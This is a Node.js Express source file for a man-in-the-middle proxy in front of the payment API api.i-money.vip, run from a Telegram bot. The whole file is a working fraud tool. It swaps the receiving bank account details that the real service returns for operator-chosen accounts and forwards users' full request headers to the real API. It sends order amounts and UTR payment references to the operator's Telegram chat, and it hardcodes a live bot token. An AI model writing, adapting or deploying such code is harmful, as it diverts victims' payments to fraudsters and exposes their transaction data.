const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');
const kv = new Redis({
  url: process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN
});

const app = express();

const ORIGINAL_API = 'https://api.i-money.vip';
const token = '8728397123:AAH7SGg0CBGLHds2QSMxps0F1FkCIvlmbvM';
const WEBHOOK_URL = 'https://ixcv.vercel.app/api/telegram';
let bot;
let webhookSet = false;

if (token) {
  bot = new TelegramBot(token);
}

async function ensureWebhook() {
  if (!bot || webhookSet) return;
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
  } catch (e) {
    console.error('Webhook error:', e.message);
  }
}

const DEFAULT_DATA = {
  banks: [],
  activeIndex: -1,
  walletType: 'paytm',
  adminChatId: null
};

async function loadData() {
  try {
    let data = await kv.get('bankData');
    if (data) {
      if (typeof data === 'string') data = JSON.parse(data);
      return data;
    }
  } catch (e) {
    console.error('KV load error:', e.message);
  }
  return { ...DEFAULT_DATA };
}

async function saveData(data) {
  try {
    await kv.set('bankData', JSON.stringify(data));
  } catch (e) {
    console.error('KV save error:', e.message);
  }
}

function getActiveBank(bankData) {
  if (bankData.activeIndex >= 0 && bankData.activeIndex < bankData.banks.length) {
    return bankData.banks[bankData.activeIndex];
  }
  return null;
}

function bankListText(bankData) {
  if (bankData.banks.length === 0) return 'No banks added yet.';
  return bankData.banks.map((b, i) => {
    const active = i === bankData.activeIndex ? ' ✅ ACTIVE' : '';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${active}`;
  }).join('\n');
}

async function proxyToOriginal(req, res) {
  try {
    const url = ORIGINAL_API + req.originalUrl;

    const forwardHeaders = {};
    const skipHeaders = ['host', 'content-length', 'connection', 'keep-alive', 'transfer-encoding', 'upgrade', 'x-forwarded-for', 'x-forwarded-proto', 'x-forwarded-host', 'x-vercel-id', 'x-real-ip', 'x-vercel-forwarded-for', 'x-vercel-deployment-url'];
    
    for (const [key, value] of Object.entries(req.headers)) {
      if (!skipHeaders.includes(key.toLowerCase()) && !key.startsWith('x-vercel')) {
        forwardHeaders[key] = value;
      }
    }
    forwardHeaders['host'] = 'api.i-money.vip';

    const fetchOptions = {
      method: req.method,
      headers: forwardHeaders
    };

    if (req.method !== 'GET' && req.method !== 'HEAD' && req.body && Object.keys(req.body).length > 0) {
      fetchOptions.body = JSON.stringify(req.body);
      forwardHeaders['content-type'] = 'application/json';
    }

    const response = await fetch(url, fetchOptions);
    const text = await response.text();

    let parsed;
    try {
      parsed = JSON.parse(text);
    } catch (e) {
      parsed = null;
    }

    if (parsed) {
      res.status(response.status).json(parsed);
      return parsed;
    } else {
      res.status(response.status).send(text || '');
      return null;
    }
  } catch (e) {
    console.error('Proxy error:', req.method, req.originalUrl, e.message);
    res.status(502).json({ code: 0, msg: 'Proxy error', error: e.message });
    return null;
  }
}

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

app.get('/setup-webhook', async (req, res) => {
  if (!bot) return res.json({ error: 'No bot token' });
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
    const info = await bot.getWebHookInfo();
    res.json({ success: true, webhook: info });
  } catch (e) {
    res.json({ error: e.message });
  }
});

app.post('/api/telegram', async (req, res) => {
  try {
    await ensureWebhook();
    if (!bot || !req.body) return res.sendStatus(200);

    const msg = req.body.message;
    if (!msg || !msg.text) return res.sendStatus(200);

    const chatId = msg.chat.id;
    const text = msg.text.trim();
    let bankData = await loadData();

    if (text === '/start') {
      if (bankData.adminChatId && bankData.adminChatId !== chatId) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }
      bankData.adminChatId = chatId;
      await saveData(bankData);
      await bot.sendMessage(chatId,
`🏦 IMoney Bank Controller

/addbank <AccNo> | <Name> | <IFSC>
/removebank <number>
/usebank <number>
/deactivate
/list
/status

Example:
/addbank 1234567890 | Rahul Kumar | SBIN0001234
/usebank 1`
      );
    }

    else if (bankData.adminChatId && chatId !== bankData.adminChatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized.');
      return res.sendStatus(200);
    }

    else if (text.startsWith('/addbank ')) {
      const parts = text.substring(9).split('|').map(s => s.trim());
      if (parts.length !== 3) {
        await bot.sendMessage(chatId, '❌ Format: /addbank AccNo | Name | IFSC');
        return res.sendStatus(200);
      }
      if (bankData.banks.length >= 10) {
        await bot.sendMessage(chatId, '❌ Max 10 banks.');
        return res.sendStatus(200);
      }
      bankData.banks.push({ accountNo: parts[0], accountHolder: parts[1], ifsc: parts[2] });
      if (bankData.banks.length === 1) bankData.activeIndex = 0;
      await saveData(bankData);
      await bot.sendMessage(chatId,
`✅ Bank #${bankData.banks.length} added:
${parts[0]} | ${parts[1]} | ${parts[2]}
${bankData.banks.length === 1 ? '(Auto-activated)' : '/usebank ' + bankData.banks.length + ' to activate'}`
      );
    }

    else if (text.startsWith('/removebank ')) {
      const num = parseInt(text.substring(12).trim());
      if (isNaN(num) || num < 1 || num > bankData.banks.length) {
        await bot.sendMessage(chatId, '❌ Invalid number. /list se check karo.');
        return res.sendStatus(200);
      }
      const removed = bankData.banks.splice(num - 1, 1)[0];
      if (bankData.activeIndex === num - 1) bankData.activeIndex = bankData.banks.length > 0 ? 0 : -1;
      else if (bankData.activeIndex > num - 1) bankData.activeIndex--;
      await saveData(bankData);
      await bot.sendMessage(chatId, `🗑 Removed: ${removed.accountHolder} | ${removed.accountNo}`);
    }

    else if (text.startsWith('/usebank ')) {
      const num = parseInt(text.substring(9).trim());
      if (isNaN(num) || num < 1 || num > bankData.banks.length) {
        await bot.sendMessage(chatId, '❌ Invalid. /list se check karo.');
        return res.sendStatus(200);
      }
      bankData.activeIndex = num - 1;
      await saveData(bankData);
      const bank = bankData.banks[bankData.activeIndex];
      await bot.sendMessage(chatId,
`✅ Bank #${num} ACTIVE:
${bank.accountNo} | ${bank.accountHolder} | ${bank.ifsc}`
      );
    }

    else if (text === '/deactivate') {
      bankData.activeIndex = -1;
      await saveData(bankData);
      await bot.sendMessage(chatId, '🔴 All banks deactivated.');
    }

    else if (text === '/list') {
      await bot.sendMessage(chatId, `🏦 Banks:\n\n${bankListText(bankData)}`);
    }

    else if (text === '/status') {
      const active = getActiveBank(bankData);
      if (!active) {
        await bot.sendMessage(chatId, '🔴 No active bank.');
        return res.sendStatus(200);
      }
      await bot.sendMessage(chatId,
`🟢 Active: ${active.accountNo} | ${active.accountHolder} | ${active.ifsc}`
      );
    }

    return res.sendStatus(200);
  } catch (err) {
    console.error('Telegram error:', err);
    return res.sendStatus(200);
  }
});

app.get('/wallet/online/walletType', async (req, res) => {
  const bankData = await loadData();
  const active = getActiveBank(bankData);
  if (active) {
    return res.json({
      code: 1,
      data: {
        receiveAccountNo: active.accountNo,
        receiveAccountName: active.accountHolder,
        receiveIfsc: active.ifsc,
        walletType: bankData.walletType || 'paytm'
      },
      msg: 'success'
    });
  }
  await proxyToOriginal(req, res);
});

app.post('/money/uploadUtr', async (req, res) => {
  const { orderId, utr, utrAmount } = req.body || {};
  
  const bankData = await loadData();
  if (bankData.adminChatId && bot) {
    bot.sendMessage(bankData.adminChatId,
`💰 UTR Uploaded!
Order: ${orderId || 'N/A'}
UTR: ${utr || 'N/A'}
Amount: ₹${utrAmount || 'N/A'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
    ).catch(() => {});
  }

  try {
    const url = ORIGINAL_API + req.originalUrl;
    const forwardHeaders = {};
    for (const [key, value] of Object.entries(req.headers)) {
      if (!['host','content-length','connection','transfer-encoding'].includes(key.toLowerCase()) && !key.startsWith('x-vercel')) {
        forwardHeaders[key] = value;
      }
    }
    forwardHeaders['host'] = 'api.i-money.vip';
    forwardHeaders['content-type'] = 'application/json';
    
    const response = await fetch(url, {
      method: 'POST',
      headers: forwardHeaders,
      body: JSON.stringify(req.body)
    });
    const text = await response.text();
    let parsed;
    try { parsed = JSON.parse(text); } catch(e) { parsed = null; }
    
    if (parsed) {
      return res.status(response.status).json(parsed);
    }
  } catch(e) {
    console.error('UTR proxy error:', e.message);
  }

  res.json({ code: 1, data: { orderId, utr, status: 'submitted' }, msg: 'UTR uploaded successfully' });
});

app.post('/money/cancelUtr', async (req, res) => {
  const bankData = await loadData();
  if (bankData.adminChatId && bot) {
    bot.sendMessage(bankData.adminChatId,
`❌ UTR Cancelled!
Order: ${req.body?.orderId || 'N/A'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
    ).catch(() => {});
  }
  await proxyToOriginal(req, res);
});

app.post('/money/orderId', async (req, res) => {
  const bankData = await loadData();
  if (bankData.adminChatId && bot) {
    bot.sendMessage(bankData.adminChatId,
`🔔 New Order!
Amount: ₹${req.body?.amount || 'N/A'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
    ).catch(() => {});
  }
  await proxyToOriginal(req, res);
});

app.post('/money/create/v2', async (req, res) => {
  const bankData = await loadData();
  if (bankData.adminChatId && bot) {
    bot.sendMessage(bankData.adminChatId,
`🔔 New Order (v2)!
Amount: ₹${req.body?.amount || 'N/A'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
    ).catch(() => {});
  }
  await proxyToOriginal(req, res);
});

app.get('/health', async (req, res) => {
  const bankData = await loadData();
  const active = getActiveBank(bankData);
  res.json({
    status: 'ok',
    mode: 'proxy',
    bankActive: !!active,
    totalBanks: bankData.banks.length,
    adminSet: !!bankData.adminChatId
  });
});

app.use(async (req, res) => {
  await proxyToOriginal(req, res);
});

module.exports = app;
